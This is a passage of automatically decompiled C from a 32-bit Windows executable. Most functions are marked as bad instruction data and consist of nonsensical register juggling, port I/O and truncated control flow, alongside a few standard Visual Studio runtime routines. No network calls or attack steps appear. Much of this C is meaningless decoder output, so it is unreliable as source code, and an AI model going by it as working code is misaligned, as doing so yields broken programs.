  undefined *puVar17;
  undefined *unaff_EDI;
  float10 in_ST0;
  undefined *local_bcec;
  int iStack48360;
  undefined *puStack88;
  short local_12;
  undefined4 uStack12;
  
  uVar13 = unaff_EBX - 1;
  puStack88 = &stack0xfffffff8;
  puVar16 = (undefined4 *)&stack0xfffffff8;
  puVar15 = (undefined4 *)&stack0xfffffff8;
  cVar9 = '\x13';
  do {
    unaff_EBP = unaff_EBP + -1;
    puVar16 = puVar16 + -1;
    *puVar16 = *unaff_EBP;
    cVar9 = cVar9 + -1;
  } while ('\0' < cVar9);
  do {
    uVar11 = param_1;
    *(short *)(uVar13 + 10) = (short)in_ST0;
    iVar1 = *(int *)((int)in_EAX + uVar11);
    puVar3 = unaff_EDI + 4;
    uVar12 = (undefined2)iStack48360;
    out(uVar12,(char)in_EAX);
    uVar2 = unaff_ESI + 8;
    out(*(undefined4 *)(unaff_ESI + 4),uVar12);
    iVar5 = *(int *)(unaff_ESI + 0xb5a79dcf);
    (&stack0xdec1d126)[uVar11 * 8] = (&stack0xdec1d126)[uVar11 * 8] + -0x79;
    param_1 = uVar11 + 1;
    in_ST0 = (float10)local_12 - (float10)iVar1;
    unaff_EDI = (undefined *)((int)in_EAX + iVar5) + 1;
    uVar8 = SUB41(puVar3,0);
    *(undefined *)((int)in_EAX + iVar5) = uVar8;
    uVar14 = uVar13 + param_1 + (uint)((byte)(param_1 >> 8) < 4);
    uVar13 = uVar14 & 0xffff0000 | (uint)CONCAT11(uVar8,(char)uVar14);
    bVar10 = (byte)(uVar14 >> 8);
    cVar9 = bVar10 + 0x51;
    in_EAX = &local_bcec;
    local_bcec = &DAT_ffffffa0;
    unaff_ESI = uVar2;
  } while (0xae < bVar10 || cVar9 == '\0');
  uVar13 = uVar13 - 1;
  *(int *)(iStack48360 + -0x7ca37cd8) = *(int *)(iStack48360 + -0x7ca37cd8) + -0x5d;
  uVar14 = (uint)CONCAT11(0x1d,(char)param_1);
  puVar17 = (undefined *)(uVar2 + uVar13);
  *(undefined4 *)(uVar13 + (int)puVar17 * 2) = 0x53939b59;
  cVar4 = *(char *)((param_1 & 0xffff0000 | uVar14) - 0x6c);
  bVar10 = in(uVar12);
  *(undefined *)((int)unaff_EDI >> 0x1e) = *puVar17;
  pbVar7 = _DAT_ffffffa4;
  *(uint *)(((uVar13 & 0xffff0000 | (uint)CONCAT11((char)(uVar13 >> 8) + -1,(char)uVar13)) - 0x5a) +
           (param_1 & 0xffff0000 |
           (uint)CONCAT11(((char)(uVar14 >> 8) - cVar4) - CARRY4(uVar2,uVar13),(char)param_1)) * 4)
       = ((uint)puVar3 & 0xffff0000 |
         (uint)(ushort)(CONCAT11(((int)uVar11 < 0) << 7 | (uVar11 == 0) << 6 |
                                 (((uint)&stack0xfffffff8 & 0x10) != 0) << 4 |
                                 ((POPCOUNT(uVar11 & 0xff) & 1U) == 0) << 2,cVar9) | 0x200)) + 1 &
         0xffffff00 | (uint)bVar10;
  _DAT_ffff2f29 = puVar17 + -2;
  out(puVar17[-1],uVar12);
  puVar16 = (undefined4 *)&DAT_ffffffa4;
  cVar9 = '\x06';
  _DAT_ffffffa4 = &stack0xfffffff8;
  do {
    puVar15 = puVar15 + -1;
    puVar16 = puVar16 + -1;
    *puVar16 = *puVar15;
    cVar9 = cVar9 + -1;
  } while ('\0' < cVar9);
  _DAT_ffffff88 = &DAT_ffffffa4;
  *pbVar7 = bVar10;
  pcVar6 = (code *)swi(3);
  (*pcVar6)();
  return;
}



void FUN_00423449(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_00423559(int param_1)

{
  uint uVar1;
  byte bVar2;
  int in_EAX;
  char cVar3;
  undefined4 unaff_EBX;
  uint *unaff_ESI;
  uint *unaff_EDI;
  
  cVar3 = (char)((uint)unaff_EBX >> 8);
  if (SBORROW1(cVar3,cVar3)) {
    uVar1 = *(uint *)(param_1 + -0x68209ba4);
    *(uint *)(param_1 + -0x68209ba4) = uVar1 << 0x19 | uVar1 >> 8;
    bVar2 = (byte)(in_EAX + 1U);
    *(undefined *)(in_EAX + 1U & 0xffffff00 | (uint)(byte)(bVar2 - 0x24)) = 0xfc;
    *(int *)(param_1 + -0x58) = *(int *)(param_1 + -0x58) + -0x69a87ac1 + (uint)(0x23 < bVar2);
  }
  else {
    _DAT_ffffffd8 =
         (uint)(CONCAT14(*unaff_ESI < *unaff_EDI,_DAT_ffffffd8) >> 0x18) | _DAT_ffffffd8 << 9;
    if (*unaff_ESI == *unaff_EDI) {
      return;
    }
  }
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data

void __fastcall Catch_All_00423574(undefined4 param_1,undefined2 param_2)

{
  undefined *unaff_ESI;
  
  out(*unaff_ESI,param_2);
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data

void FUN_00423587(void)

{
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Instruction at (ram,0x00423543) overlaps instruction at (ram,0x00423541)
// 
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

float10 __fastcall FUN_004235a2(int param_1,undefined2 param_2)

{
  uint *puVar1;
  uint uVar2;
  uint uVar3;
  byte bVar4;
  uint *in_EAX;
  uint uVar5;
  uint uVar6;
  uint *puVar7;
  char cVar8;
  int unaff_EBX;
  uint *unaff_ESI;
  uint *unaff_EDI;
  byte in_CF;
  bool bVar9;
  char in_ZF;
  float10 in_ST0;
  
  uVar5 = param_1 - 1;
  if (uVar5 == 0 || in_ZF == '\0') {
    bVar9 = CARRY4((uint)&stack0xfffffffc,*(uint *)((int)unaff_EDI + 0x1a046e59));
    in_EAX = unaff_ESI;
  }
  else {
    while( true ) {
      bVar9 = CARRY4((uint)unaff_EDI,(uint)&stack0xfffffffc) ||
              CARRY4((uint)(undefined *)((int)unaff_EDI + (int)&stack0xfffffffc),(uint)in_CF);
      unaff_EDI = (uint *)((undefined *)((int)unaff_EDI + (int)&stack0xfffffffc) + in_CF);
      *unaff_EDI = 0x63a89113;
      bVar4 = (byte)in_EAX;
      out(param_2,bVar4);
      puVar7 = unaff_EDI;
      if (unaff_EDI == (uint *)0x0) break;
      in_CF = 0;
    }
    while( true ) {
      in_ST0 = in_ST0 + (float10)*(short *)((int)unaff_EDI + -0x39a4626b);
      if (-1 >= (int)puVar7) break;
      *(undefined4 *)(unaff_EBX + -0x65) = 0x89ff9992;
      puVar1 = (uint *)((int)unaff_EDI + 1);
      *(byte *)unaff_EDI = bVar4;
      uVar6 = (int)in_EAX >> 0x1f;
      if (-1 < (int)puVar7) {
        *(char *)(param_1 + 0x38) = *(char *)(param_1 + 0x38) << 1;
        *(char *)(unaff_EBX + -0x67) = (char)uVar5;
        *(uint *)(param_1 + -0x2de29459) = *(uint *)(param_1 + -0x2de29459) | uVar6;
        in((short)((int)in_EAX >> 0x1f));
                    // WARNING: Bad instruction - Truncating control flow here
        halt_baddata();
      }
      *(byte *)((int)unaff_ESI + 0x116fa87a) = *(byte *)((int)unaff_ESI + 0x116fa87a) ^ bVar4;
      unaff_EDI = (uint *)((int)unaff_EDI + 5);
      uVar2 = (uint)(*unaff_ESI < *puVar1);
      uVar3 = uVar6 + *(uint *)(param_1 + 0x75ee63a7);
      bVar9 = CARRY4(uVar6,*(uint *)(param_1 + 0x75ee63a7)) || CARRY4(uVar3,uVar2);
      puVar7 = (uint *)(uVar3 + uVar2);
      unaff_ESI = unaff_ESI + 1;
    }
    uVar5 = uVar5 & 0xffffff00 |
            (uint)(byte)(((char)uVar5 - *(char *)(unaff_EBX + 0x2982a2c2)) - bVar9);
    bVar9 = false;
    cVar8 = (char)((uint)unaff_EBX >> 8);
    if (!SBORROW1(cVar8,cVar8)) {
      _DAT_ffffffd8 =
           (uint)(CONCAT14(*unaff_ESI < *unaff_EDI,_DAT_ffffffd8) >> 0x18) | _DAT_ffffffd8 << 9;
      if (*unaff_ESI != *unaff_EDI) {
        return;
      }
      return in_ST0;
    }
  }
  uVar6 = *(uint *)(uVar5 + 0x97df645c);
  *(uint *)(uVar5 + 0x97df645c) = uVar6 << 0x19 | (uint)(CONCAT14(bVar9,uVar6) >> 8);
  bVar4 = (byte)((int)in_EAX + 1U);
  *(undefined *)((int)in_EAX + 1U & 0xffffff00 | (uint)(byte)(bVar4 - 0x24)) = 0xf8;
  *(int *)(uVar5 - 0x58) = *(int *)(uVar5 - 0x58) + -0x69a87ac1 + (uint)(0x23 < bVar4);
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data

void __fastcall FUN_004235c0(int param_1)

{
  undefined *in_EAX;
  byte in_CF;
  
  *in_EAX = 0;
  *(int *)(param_1 + -0x58) = *(int *)(param_1 + -0x58) + -0x69a87ac1 + (uint)in_CF;
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Unable to track spacebase fully for stack
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_004237bf(uint param_1,int param_2)

{
  byte *pbVar1;
  char *pcVar2;
  char cVar3;
  code *pcVar5;
  byte bVar6;
  ushort uVar7;
  uint *in_EAX;
  unkbyte10 *pVar8;
  byte bVar9;
  char cVar10;
  undefined uVar11;
  unkbyte10 *pVar12;
  int unaff_EBX;
  int *piVar13;
  int *unaff_EBP;
  uint uVar14;
  int *piVar15;
  unkbyte10 *unaff_EDI;
  bool bVar16;
  unkbyte10 in_ST0;
  uint local_4;
  char cVar4;
  undefined extraout_DL;
  
  pVar12 = (unkbyte10 *)(param_2 + -1);
  pbVar1 = (byte *)(param_2 + -0x1eb99af9);
  *pbVar1 = *pbVar1 >> 3 | *pbVar1 << 5;
  if ((POPCOUNT((uint)pVar12 & 0xff) & 1U) != 0) {
    return;
  }
  bVar16 = false;
  *(byte *)((int)unaff_EBP + -0x6e3e6ba9) = *(byte *)((int)unaff_EBP + -0x6e3e6ba9) & 0xfc;
  *(char *)((int)unaff_EDI + unaff_EBX * 8 + -0x69) = (char)((uint)&local_4 >> 8);
  bVar9 = (byte)param_1;
  pVar8 = (unkbyte10 *)&local_4;
  local_4 = param_1;
  if (param_1 != 0) {
    bVar6 = (bVar9 & 0x1f) % 9;
    uVar7 = (ushort)bVar9 << bVar6;
    local_4 = param_1 & 0xffffff00 | (uint)(byte)((byte)uVar7 | bVar9 >> 9 - bVar6);
    bVar16 = (uVar7 & 0x100) != 0;
    pVar8 = pVar12;
    pVar12 = (unkbyte10 *)&local_4;
  }
  pcVar2 = (char *)((int)pVar8 + 0x5596f10d);
  cVar3 = *pcVar2;
  cVar10 = (char)(param_1 >> 8);
  cVar4 = *pcVar2;
  *pcVar2 = cVar4 + cVar10 + bVar16;
  if (SCARRY1(cVar3,cVar10) == SCARRY1(cVar4 + cVar10,bVar16)) {
    in_EAX[-1] = (uint)unaff_EBP;
    bVar16 = SBORROW4((int)pVar12,1);
    pVar12 = (unkbyte10 *)((int)pVar12 + -1);
    if (!bVar16) {
      piVar15 = (int *)*unaff_EBP;
      *unaff_EBP = (int)piVar15;
      cVar3 = '\x1c';
      piVar13 = unaff_EBP;
      do {
        piVar15 = piVar15 + -1;
        piVar13 = piVar13 + -1;
        *piVar13 = *piVar15;
        cVar3 = cVar3 + -1;
      } while ('\0' < cVar3);
      unaff_EBP[-0x1d] = (int)unaff_EBP;
      *(uint *)unaff_EDI = (uint)pVar8 & 0xffffff00 | (uint)(byte)((char)pVar8 + 0x6e);
      unaff_EBP[-0x4f4] = param_1;
      unaff_EBP[-0x4f5] = 0x6a;
      piVar13 = unaff_EBP + -0x4f6;
      unaff_EBP[-0x4f6] = (int)unaff_EBP;
      cVar3 = '\x13';
      piVar15 = unaff_EBP;
      do {
        piVar15 = piVar15 + -1;
        piVar13 = piVar13 + -1;
        *piVar13 = *piVar15;
        cVar3 = cVar3 + -1;
      } while ('\0' < cVar3);
      unaff_EBP[-0x50a] = (int)(unaff_EBP + -0x4f6);
      do {
                    // WARNING: Do nothing block with infinite loop
      } while( true );
    }
  }
  else {
    uVar14 = *in_EAX;
    bVar16 = SBORROW1(cVar10,'y');
    *in_EAX = 0xde04d0ee;
    *(uint *)((int)pVar8 - 0x38) = uVar14;
    unaff_EDI = pVar8;
  }
  uVar11 = SUB41(pVar12,0);
  pcVar5 = (code *)swi(4);
  if (bVar16 == true) {
    in_ST0 = (*pcVar5)();
    uVar11 = extraout_DL;
  }
  *(undefined *)((int)unaff_EDI + 0x6c) = uVar11;
  *unaff_EDI = in_ST0;
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Unable to track spacebase fully for stack
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_00423836(undefined4 param_1,int param_2)

{
  char cVar1;
  code *pcVar2;
  undefined uVar3;
  int *piVar4;
  int *unaff_EBP;
  int *piVar5;
  unkbyte10 *unaff_ESI;
  unkbyte10 *unaff_EDI;
  bool in_OF;
  bool bVar6;
  unkbyte10 in_ST0;
  undefined extraout_DL;
  
  if (in_OF) {
    bVar6 = SBORROW1((char)((uint)param_1 >> 8),'y');
    *(int **)((int)unaff_ESI + -0x38) = unaff_EBP;
    unaff_EDI = unaff_ESI;
  }
  else {
    bVar6 = SBORROW4(param_2,1);
    param_2 = param_2 + -1;
    if (!bVar6) {
      piVar5 = (int *)*unaff_EBP;
      *unaff_EBP = (int)piVar5;
      cVar1 = '\x1c';
      piVar4 = unaff_EBP;
      do {
        piVar5 = piVar5 + -1;
        piVar4 = piVar4 + -1;
        *piVar4 = *piVar5;
        cVar1 = cVar1 + -1;
      } while ('\0' < cVar1);
      unaff_EBP[-0x1d] = (int)unaff_EBP;
      *(uint *)unaff_EDI = (uint)unaff_ESI & 0xffffff00 | (uint)(byte)((char)unaff_ESI + 0x6e);
      unaff_EBP[-0x4f4] = param_1;
      unaff_EBP[-0x4f5] = 0x6a;
      piVar4 = unaff_EBP + -0x4f6;
      unaff_EBP[-0x4f6] = (int)unaff_EBP;
      cVar1 = '\x13';
      piVar5 = unaff_EBP;
      do {
        piVar5 = piVar5 + -1;
        piVar4 = piVar4 + -1;
        *piVar4 = *piVar5;
        cVar1 = cVar1 + -1;
      } while ('\0' < cVar1);
      unaff_EBP[-0x50a] = (int)(unaff_EBP + -0x4f6);
      do {
                    // WARNING: Do nothing block with infinite loop
      } while( true );
    }
  }
  uVar3 = (undefined)param_2;
  pcVar2 = (code *)swi(4);
  if (bVar6 == true) {
    in_ST0 = (*pcVar2)();
    uVar3 = extraout_DL;
  }
  *(undefined *)((int)unaff_EDI + 0x6c) = uVar3;
  *unaff_EDI = in_ST0;
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data

void __fastcall FUN_0042383f(undefined4 param_1,undefined param_2)

{
  code *pcVar1;
  undefined extraout_DL;
  undefined4 unaff_EBP;
  unkbyte10 *unaff_EDI;
  char in_OF;
  unkbyte10 in_ST0;
  
  *(undefined4 *)((int)unaff_EDI + -0x38) = unaff_EBP;
  pcVar1 = (code *)swi(4);
  if (in_OF == '\x01') {
    in_ST0 = (*pcVar1)();
    param_2 = extraout_DL;
  }
  *(undefined *)((int)unaff_EDI + 0x6c) = param_2;
  *unaff_EDI = in_ST0;
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



uint __fastcall FUN_004238e3(undefined4 param_1,uint param_2)

{
  byte *pbVar1;
  char *pcVar2;
  byte bVar3;
  uint uVar4;
  char cVar5;
  byte bVar6;
  ushort uVar7;
  undefined *in_EAX;
  undefined4 *puVar8;
  undefined4 *unaff_EBP;
  byte *unaff_ESI;
  int unaff_EDI;
  bool in_ZF;
  int unaff_retaddr;
  undefined4 uStack8;
  
  pbVar1 = (byte *)(unaff_EDI + -0x7164bc39);
  *pbVar1 = *pbVar1 << 5 | *pbVar1 >> 3;
  if (in_ZF) {
    puVar8 = (undefined4 *)&stack0xfffffffc;
    cVar5 = '\x13';
    do {
      unaff_EBP = unaff_EBP + -1;
      puVar8 = puVar8 + -1;
      *puVar8 = *unaff_EBP;
      cVar5 = cVar5 + -1;
    } while ('\0' < cVar5);
    do {
                    // WARNING: Do nothing block with infinite loop
    } while( true );
  }
  bVar3 = *(byte *)(unaff_EDI + 3);
  *(byte *)(unaff_EDI + 3) = (byte)param_2;
  bVar6 = ((byte)param_1 & 0x1f) % 9;
  uVar7 = CONCAT11((*pbVar1 & 1) != 0,*in_EAX);
  uVar7 = uVar7 << bVar6 | uVar7 >> 9 - bVar6;
  *in_EAX = (char)uVar7;
  pcVar2 = (char *)((param_2 & 0xffffff00 | (uint)bVar3) + 0x5593f10d);
  *pcVar2 = *pcVar2 + (char)((uint)param_1 >> 8) + ((uVar7 & 0x100) != 0);
  *(int *)(unaff_retaddr + -0x29) = *(int *)(unaff_retaddr + -0x29) >> ((byte)unaff_retaddr & 0x1f);
  bVar3 = *unaff_ESI;
  uVar4 = *(uint *)((int)unaff_EBP + 0x3b58dbeb);
  *(int *)(in_EAX + 0x7b) = *(int *)(in_EAX + 0x7b) + 1;
  return (uint)in_EAX & 0xffffff00 | (uint)bVar3 | uVar4;
}



uint __fastcall thunk_FUN_004238e3(undefined4 param_1,uint param_2)

{
  byte *pbVar1;
  char *pcVar2;
  byte bVar3;
  uint uVar4;
  char cVar5;
  byte bVar6;
  ushort uVar7;
  undefined *in_EAX;
  undefined4 *puVar8;
  undefined4 *unaff_EBP;
  byte *unaff_ESI;
  int unaff_EDI;
  bool in_ZF;
  int unaff_retaddr;
  undefined4 uStack8;
  
  pbVar1 = (byte *)(unaff_EDI + -0x7164bc39);
  *pbVar1 = *pbVar1 << 5 | *pbVar1 >> 3;
  if (in_ZF) {
    puVar8 = (undefined4 *)&stack0xfffffffc;
    cVar5 = '\x13';
    do {
      unaff_EBP = unaff_EBP + -1;
      puVar8 = puVar8 + -1;
      *puVar8 = *unaff_EBP;
      cVar5 = cVar5 + -1;
    } while ('\0' < cVar5);
    do {
                    // WARNING: Do nothing block with infinite loop
    } while( true );
  }
  bVar3 = *(byte *)(unaff_EDI + 3);
  *(byte *)(unaff_EDI + 3) = (byte)param_2;
  bVar6 = ((byte)param_1 & 0x1f) % 9;
  uVar7 = CONCAT11((*pbVar1 & 1) != 0,*in_EAX);
  uVar7 = uVar7 << bVar6 | uVar7 >> 9 - bVar6;
  *in_EAX = (char)uVar7;
  pcVar2 = (char *)((param_2 & 0xffffff00 | (uint)bVar3) + 0x5593f10d);
  *pcVar2 = *pcVar2 + (char)((uint)param_1 >> 8) + ((uVar7 & 0x100) != 0);
  *(int *)(unaff_retaddr + -0x29) = *(int *)(unaff_retaddr + -0x29) >> ((byte)unaff_retaddr & 0x1f);
  bVar3 = *unaff_ESI;
  uVar4 = *(uint *)((int)unaff_EBP + 0x3b58dbeb);
  *(int *)(in_EAX + 0x7b) = *(int *)(in_EAX + 0x7b) + 1;
  return (uint)in_EAX & 0xffffff00 | (uint)bVar3 | uVar4;
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Instruction at (ram,0x00423b4f) overlaps instruction at (ram,0x00423b4e)
// 

void __fastcall
FUN_004239f6(undefined4 param_1,int param_2,undefined4 param_3,int param_4,undefined4 param_5,
            undefined4 param_6,int param_7,int param_8,undefined4 param_9)

{
  undefined6 uVar1;
  byte bVar2;
  uint unaff_EBX;
  int unaff_EBP;
  int unaff_ESI;
  undefined4 *unaff_retaddr;
  char cVar3;
  
  while( true ) {
    cVar3 = (char)*(undefined6 *)(unaff_ESI + unaff_EBX * 8);
    bVar2 = cVar3 + 0x50;
    if ((char)bVar2 < '\0') {
      uVar1 = *(undefined6 *)(param_2 + -0x76);
      *(uint *)(unaff_EBX - 0x21) = *(uint *)(unaff_EBX - 0x21) ^ unaff_EBX;
      *(byte *)(unaff_EBP + -0x4f1e87d0) =
           *(byte *)(unaff_EBP + -0x4f1e87d0) & ((char)uVar1 + -0x2e) - (bVar2 < 0x8b);
                    // WARNING: Bad instruction - Truncating control flow here
      halt_baddata();
    }
    if (SCARRY1(cVar3,'P') == (char)bVar2 < '\0') break;
    *(undefined4 *)(unaff_ESI + unaff_EBX * 8) = 0xde04c787;
  }
  *unaff_retaddr = param_9;
  if ((char)(unaff_EBX >> 8) != 'u') {
    *(undefined4 *)(param_8 * 4 + -0x7fb194c6) = 0x4e74ab61;
    *(undefined4 *)(param_7 * 9) = 0x6804c787;
    *(undefined4 *)(&stack0x00000020 + param_4 * 2) = 0x8a048786;
                    // WARNING: Bad instruction - Truncating control flow here
    halt_baddata();
  }
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Instruction at (ram,0x00423b4f) overlaps instruction at (ram,0x00423b4e)
// 

void __fastcall
FUN_00423acc(undefined4 param_1,int param_2,undefined4 param_3,int param_4,undefined4 param_5,
            undefined4 param_6,int param_7,int param_8,undefined4 param_9)

{
  undefined6 uVar1;
  byte bVar2;
  uint unaff_EBX;
  int unaff_EBP;
  int unaff_ESI;
  undefined4 *unaff_retaddr;
  char cVar3;
  
  while( true ) {
    cVar3 = (char)*(undefined6 *)(unaff_ESI + unaff_EBX * 8);
    bVar2 = cVar3 + 0x50;
    if ((char)bVar2 < '\0') {
      uVar1 = *(undefined6 *)(param_2 + -0x76);
      *(uint *)(unaff_EBX - 0x21) = *(uint *)(unaff_EBX - 0x21) ^ unaff_EBX;
      *(byte *)(unaff_EBP + -0x4f1e87d0) =
           *(byte *)(unaff_EBP + -0x4f1e87d0) & ((char)uVar1 + -0x2e) - (bVar2 < 0x8b);
                    // WARNING: Bad instruction - Truncating control flow here
      halt_baddata();
    }
    if (SCARRY1(cVar3,'P') == (char)bVar2 < '\0') break;
    *(undefined4 *)(unaff_ESI + unaff_EBX * 8) = 0xde04c787;
  }
  *unaff_retaddr = param_9;
  if ((char)(unaff_EBX >> 8) != 'u') {
    *(undefined4 *)(param_8 * 4 + -0x7fb194c6) = 0x4e74ab61;
    *(undefined4 *)(param_7 * 9) = 0x6804c787;
    *(undefined4 *)(&stack0x00000020 + param_4 * 2) = 0x8a048786;
                    // WARNING: Bad instruction - Truncating control flow here
    halt_baddata();
  }
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Instruction at (ram,0x004248dd) overlaps instruction at (ram,0x004248dc)
// 
// WARNING: Removing unreachable block (ram,0x00424989)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_00424895(int param_1,int param_2)

{
  int *piVar1;
  byte *pbVar2;
  uint *puVar3;
  byte bVar4;
  uint uVar5;
  undefined uVar6;
  byte bVar7;
  char cVar8;
  uint in_EAX;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  int unaff_EBX;
  int unaff_EBP;
  int unaff_ESI;
  int iVar12;
  int unaff_EDI;
  byte in_CF;
  byte in_AF;
  
  bVar4 = 9 < ((byte)in_EAX & 0xf) | in_AF;
  bVar7 = (byte)in_EAX + bVar4 * -6;
  bVar7 = bVar7 + (0x9f < bVar7 | in_CF | bVar4 * (bVar7 < 6)) * -0x60;
  uVar11 = in_EAX & 0xffffff00 | (uint)bVar7;
  out(0xb3,bVar7);
  uVar10 = unaff_EDI + 1;
  iVar12 = unaff_ESI + 1;
  if (param_1 == 0) {
    *(undefined4 *)(iVar12 + unaff_EBX * 8) = 0xde04c787;
  }
  else {
    uVar5 = in_EAX & 0xffffff00 | (uint)(byte)(bVar7 + 0xb4);
    uVar11 = uVar5 + 0xf9ed601d;
    uVar9 = uVar11 - (bVar7 < 0x4c);
    iVar12 = unaff_ESI + 2;
    if (param_1 - 1U == 0 || iVar12 != 0) {
      *(char *)(unaff_ESI + -0x21d70476) =
           *(char *)(unaff_ESI + -0x21d70476) + (char)(uVar9 >> 8) +
           (uVar5 < 0x6129fe3 || uVar11 < (bVar7 < 0x4c));
      puVar3 = (uint *)(uVar9 * 2 + -0x395bdf8d);
      *puVar3 = *puVar3 | param_1 - 1U;
                    // WARNING: Bad instruction - Truncating control flow here
      halt_baddata();
    }
    cVar8 = (char)uVar10;
    uVar11 = uVar10 & 0xffffff00;
    uVar10 = uVar9 & 0xffffff00;
    uVar11 = uVar11 | (byte)(cVar8 + 0xbc);
  }
  pbVar2 = (byte *)(param_2 + unaff_EBP + 1);
  *pbVar2 = *pbVar2 << 5 | *pbVar2 >> 3;
  *(undefined4 *)(param_2 + (uVar11 & 0xffffff00 | (uint)(byte)((char)uVar11 - 0x20)) * 4) =
       0x66b9feb7;
  swi(4);
  DAT_be7db7c4 = in((ushort)CONCAT31((int3)(uVar10 >> 8),0xa7) & 0x24bf);
  in(0xb5);
  out(0xbcdc,(char)iVar12);
  *(undefined2 *)(iVar12 + -0x77) = _DAT_bc1dbe93;
  uVar6 = DAT_0987ffbe;
  out(_DAT_befb4772,(short)(iVar12 >> 0x1f));
  DAT_c11bbca6 = DAT_c11bbca6 << 2 | DAT_c11bbca6 >> 6;
  DAT_0987ffbe = 0x43;
  DAT_bb27bca6 = DAT_bb27bca6 << 2 | DAT_bb27bca6 >> 6;
  _DAT_bc1dbe97 = 0x4c0b7df;
  *(undefined *)((iVar12 >> 0x1f) + 0x1302df7c) = 0x80;
  *(undefined4 *)
   ((iVar12 >> 0x1f) + (iVar12 + 1U & 0xffff0000 | (uint)CONCAT11(0xdf,(char)(iVar12 + 1U))) * 8) =
       0x57bb9eba;
  piVar1 = (int *)(CONCAT22(0xbb7d,CONCAT11(uVar6,0x8c)) + -0x4422bc14);
  *piVar1 = *piVar1 >> 1;
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



void FUN_004262ff(void)

{
  return;
}



// Library Function - Single Match
//  __aulldiv
// 
// Library: Visual Studio

undefined8 __aulldiv(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



byte __cdecl FUN_00426fd8(int param_1)

{
  return -(param_1 != 0) & 1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __getbuf
// 
// Library: Visual Studio 2012 Release

void __cdecl __getbuf(FILE *_File)

{
  char *pcVar1;
  
  _DAT_00437520 = _DAT_00437520 + 1;
  pcVar1 = (char *)FUN_00417755(0x1000);
  _File->_base = pcVar1;
  if (pcVar1 == (char *)0x0) {
    _File->_flag = _File->_flag | 4;
    _File->_base = (char *)&_File->_charbuf;
    _File->_bufsiz = 2;
  }
  else {
    _File->_flag = _File->_flag | 8;
    _File->_bufsiz = 0x1000;
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return;
}



undefined8 __cdecl FUN_00427042(WCHAR param_1,FILE *param_2)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  undefined *puVar4;
  uint extraout_ECX;
  undefined *puVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  undefined8 uVar8;
  int local_14;
  uint local_10 [2];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  if ((*(byte *)&param_2->_flag & 0x40) == 0) {
    iVar2 = FUN_0041c7e6();
    puVar5 = &DAT_004352d0;
    if ((iVar2 == -1) || (iVar2 = FUN_0041c7e6(), iVar2 == -2)) {
      puVar4 = &DAT_004352d0;
    }
    else {
      iVar2 = FUN_0041c7e6();
      uVar3 = FUN_0041c7e6();
      puVar4 = (undefined *)((uVar3 & 0x1f) * 0x40 + (&DAT_00436a38)[iVar2 >> 5]);
    }
    if ((puVar4[0x24] & 0x7f) != 2) {
      iVar2 = FUN_0041c7e6();
      if ((iVar2 == -1) || (iVar2 = FUN_0041c7e6(), iVar2 == -2)) {
        puVar4 = &DAT_004352d0;
      }
      else {
        iVar2 = FUN_0041c7e6();
        uVar3 = FUN_0041c7e6();
        puVar4 = (undefined *)((uVar3 & 0x1f) * 0x40 + (&DAT_00436a38)[iVar2 >> 5]);
      }
      if ((puVar4[0x24] & 0x7f) != 1) {
        iVar2 = FUN_0041c7e6();
        if ((iVar2 != -1) && (iVar2 = FUN_0041c7e6(), iVar2 != -2)) {
          iVar2 = FUN_0041c7e6();
